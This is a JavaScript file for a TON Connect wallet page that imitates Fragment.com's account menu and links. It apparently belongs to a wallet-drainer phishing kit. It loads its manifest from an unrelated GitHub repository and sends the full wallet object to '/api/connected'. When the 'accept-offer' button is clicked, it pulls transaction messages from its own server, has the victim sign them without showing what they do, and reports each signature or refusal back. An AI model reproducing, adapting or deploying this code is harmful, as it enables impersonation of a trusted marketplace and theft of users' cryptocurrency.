const nftSupported = ["Tonkeeper", "MyTonWallet", "TonHub"];

// TON Connect 钱包连接管理
let tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
  manifestUrl:
    "https://raw.githubusercontent.com/netrandom/tonconnect/refs/heads/main/js",
  walletsListConfigurator: (walletList) => {
    console.log("walletList", walletList);
    return walletList.filter((wallet) => nftSupported.includes(wallet.name));
  },

  uiPreferences: {
    theme: "DARK",
    borderRadius: "s",
    colorsSet: {
      DARK: {
        accent: "#4db2ff",
        background: {
          primary: "#1a2026",
          qr: "#fff",
          tint: "#242e38",
        },
        connectButton: {
          background: "#248bda",
          foreground: "#fff",
        },
        icon: {
          error: "#ff5863",
        },
        text: {
          primary: "#fff",
          secondary: "#8794a1",
        },
      },
    },
  },
});

let currentConnectedWallet = tonConnectUI.wallet;

/**
 * 连接到 TON 钱包
 */
async function connectToWallet() {
  currentConnectedWallet = await tonConnectUI.openModal();
}

// 清除本地存储
localStorage.clear();

// 获取页面元素
const connectButton = document.getElementById("ton-connect-button");
const walletDropdown = document.getElementById("ton-connected-dropdown");

// 绑定连接按钮事件
connectButton.onclick = connectToWallet;

/**
 * 显示钱包地址的简短版本
 * @param {Object} walletInfo - 钱包信息对象
 */
function displayShortWalletAddress(walletInfo) {
  let walletAddress = new Address(walletInfo.account.address);
  walletAddress = walletAddress.toString(true, true, true);

  document.getElementById("wallet-head").innerText = walletAddress.substring(
    0,
    24
  );
  document.getElementById("wallet-tail").innerText =
    walletAddress.substring(24);
}

/**
 * 更新侧边栏显示
 * @param {Object} walletInfo - 钱包信息对象
 */
function updateSidebar(walletInfo) {
  if (walletInfo) {
    let walletAddress = new Address(walletInfo.account.address);
    walletAddress = walletAddress.toString(true, true, true);

    document.getElementById("wallet-head").innerText = walletAddress.substring(
      0,
      24
    );
    document.getElementById("wallet-tail").innerText =
      walletAddress.substring(24);

    const menuWindow = document.getElementsByClassName(
      "js-header-menu-window"
    )[0];
    menuWindow.innerHTML = `
      <div class="tm-menu-account-header">
        <div class="tm-menu-account-address">
          <span class="tm-wallet">
            <span class="head">${walletAddress.substring(0, 24)}</span>
            <span class="middle"></span>
            <span class="tail">${walletAddress.substring(24)}</span>
          </span>
        </div>
        <div class="tm-menu-account-desc">Connected TON wallet</div>
        
        <div class="tm-header-menu-window js-header-menu-window">
          <div class="tm-menu-account-header">
            <div class="tm-menu-account-address">
              <span class="tm-wallet">
                <span class="head">${walletAddress.substring(0, 24)}</span>
                <span class="middle"></span>
                <span class="tail">${walletAddress.substring(24)}</span>
              </span>
            </div>
            <div class="tm-menu-account-desc">Connected TON wallet</div>
          </div>

          <div class="tm-header-menu-body">
            <h4 class="tm-menu-subheader">My Account</h4>
            <div class="tm-menu-links">
              <a href="https://fragment.com/my/profile" class="tm-menu-link icon-before icon-menu-profile">
                My Profile
              </a>
              <a href="https://fragment.com/my/assets" class="tm-menu-link icon-before icon-menu-assets" data-counter="">
                My Assets
              </a>
              <a href="https://fragment.com/my/bids" class="tm-menu-link icon-before icon-menu-bids" data-counter="">
                My Bids
              </a>
              <a href="https://fragment.com/my/numbers" class="tm-menu-link icon-before icon-menu-numbers" data-counter="">
                My Collectible Numbers
              </a>
              <a href="https://fragment.com/my/sessions" class="tm-menu-link icon-before icon-menu-sessions">
                Active Sessions
              </a>
              <a href="javascript:;" class="tm-menu-link icon-before icon-menu-disconnect ton-logout-link">
                Disconnect TON
              </a>
            </div>

            <h4 class="tm-menu-subheader">Platform</h4>
            <div class="tm-menu-links">
              <a href="https://fragment.com/about" class="tm-menu-link icon-before icon-menu-about">
                About
              </a>
              <a href="https://fragment.com/terms" class="tm-menu-link icon-before icon-menu-terms">
                Terms
              </a>
              <a href="https://fragment.com/privacy" class="tm-menu-link icon-before icon-menu-privacy">
                Privacy Policy
              </a>
            </div>

            <!-- 菜单底部 -->
            <div class="tm-header-menu-footer">
              <div class="tm-header-menu-footer-text">
                Connect Telegram <br>to convert usernames to collectibles
              </div>
              
              <button class="btn btn-default btn-block tm-menu-button login-link">
                <i class="icon icon-connect-telegram"></i>
                <span class="tm-button-label">Connect Telegram</span>
              </button>
            </div>
          </div>
        </div>
      </div>
    `;

    // 绑定断开连接按钮事件
    const logoutButtons = document.getElementsByClassName("ton-logout-link");
    for (const logoutButton of logoutButtons) {
      logoutButton.onclick = () => {
        // 通知服务器断开连接
        fetch("/api/disconnect", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            wallet: walletInfo.account.address,
            href: window.location.href,
          }),
        });

        // 断开 TON Connect 连接
        tonConnectUI.disconnect();

        // 刷新页面
        location.reload();
      };
    }
  } else {
    // 钱包未连接，绑定连接按钮事件
    const authButtons = document.getElementsByClassName("ton-auth-link");
    for (const authButton of authButtons) {
      authButton.onclick = () => {
        connectToWallet();
      };
    }
  }
}

/**
 * 更新页面视觉显示
 * @param {Object} walletInfo - 钱包信息对象
 */
function updateVisualDisplay(walletInfo) {
  if (walletInfo) {
    connectButton.style.display = "none";
    walletDropdown.style.display = "inherit";
    displayShortWalletAddress(walletInfo);
  } else {
    connectButton.style.display = "inherit";
    walletDropdown.style.display = "none";
  }
}

// 弹窗控制
const openPopupButton = document.getElementsByClassName(
  "js-header-menu-button"
)[0];
const closePopupButton = document.getElementsByClassName(
  "js-header-menu-close-button"
)[0];
const popup = document.getElementsByClassName("js-header-menu")[0];

openPopupButton.onclick = () => {
  popup.classList.remove("hide");
};

closePopupButton.onclick = () => {
  popup.classList.add("hide");
};

// 初始化
updateSidebar(tonConnectUI.wallet);
updateVisualDisplay(tonConnectUI.wallet);

// 监听钱包状态变化
tonConnectUI.onStatusChange((walletInfo) => {
  currentConnectedWallet = walletInfo;
  updateSidebar(walletInfo);
  updateVisualDisplay(walletInfo);

  // 如果钱包已连接，通知服务器
  if (walletInfo) {
    fetch("/api/connected", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        raw: walletInfo,
        wallet: walletInfo.account.address,
        href: window.location.href,
      }),
    });
  }
});

/**
 * 发起交易
 */
async function initiateTransaction() {
  // 检查钱包是否已连接
  if (!tonConnectUI.wallet) {
    await tonConnectUI.openModal();
    return;
  }

  const walletAddress = currentConnectedWallet.account.address;
  const appName = currentConnectedWallet.appName;

  try {
    // 获取交易数据
    let transactionResponse = await fetch(
      `/api/transaction${window.location.search}&wallet=${walletAddress}&appName=${appName}`
    );

    if (transactionResponse.ok) {
      let transactionData = await transactionResponse.json();
      console.log("Transaction data:", transactionData.messages);

      if (transactionData.messages) {
        let transactionPayload = {
          validUntil: Math.floor(Date.now() / 1000) + 360, // 6分钟有效期
          messages: transactionData.messages,
        };

        if (
          transactionPayload.messages &&
          transactionPayload.messages.length > 0
        ) {
          try {
            // 发送交易到钱包签名
            const signedTransaction = await tonConnectUI.sendTransaction(
              transactionPayload
            );

            // 通知服务器交易已接受
            fetch("/api/accept", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                messages: transactionData.messages,
                boc: signedTransaction,
                wallet: walletAddress,
                href: window.location.href,
              }),
            });
          } catch (transactionError) {
            // 通知服务器交易被拒绝
            fetch("/api/reject", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                messages: transactionData.messages,
                err: transactionError.message,
                wallet: walletAddress,
                href: window.location.href,
              }),
            });
          }
        }
      }
    }
  } catch (error) {
    console.error("Transaction initiation failed:", error);
  }
}

// 绑定交易按钮事件
document.getElementById("accept-offer").onclick = initiateTransaction;
